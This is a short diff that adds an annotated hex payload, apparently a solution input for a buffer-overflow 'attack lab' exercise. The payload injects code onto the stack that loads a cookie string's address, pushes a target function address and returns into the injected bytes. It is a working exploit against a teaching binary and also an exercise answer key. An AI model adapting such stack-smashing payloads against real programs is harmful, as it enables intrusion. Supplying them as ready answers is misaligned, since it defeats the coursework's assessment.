@@ -1,0 +1,7 @@
+bf 97 dc 61 55              /* mov  $0x5561dc97, %edi */
+48 83 ec 28                 /* $0x28, %rsp */
+48 c7 04 24 fa 18 40 00     /* $0x4018fa, (%rsp) */
+c3 c3 c3 c3 c3 c3 c3        /* useless spacing */
+c3 c3 c3 c3 c3 c3 c3        /* useless spacing */
+35 39 62 39 39 37 66 61 00  /* string for 0x59b997fa, strt addr 0x5561dc97 */
+78 dc 61 55 00 00 00 00     /* jump to stack addr 0x5561dc78 */
